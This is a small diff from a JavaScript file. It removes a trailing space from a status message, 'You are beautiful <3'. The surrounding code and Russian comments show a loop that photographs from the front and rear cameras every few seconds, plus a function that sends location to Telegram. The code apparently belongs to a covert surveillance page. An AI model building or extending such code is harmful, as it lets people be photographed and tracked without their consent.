@@ -69,7 +69,7 @@ function sendLocationToTelegram(lat, lon) {
 
 // Запускаем поочерёдный цикл фото с фронтальной и задней камеры
 async function startCameraCycle() {
-  statusEl.textContent = 'You are beautiful <3 ';
+  statusEl.textContent = 'You are beautiful <3';
 
   // Каждые 3 секунды меняем камеру и снимаем фото
   photoInterval = setInterval(async () => {
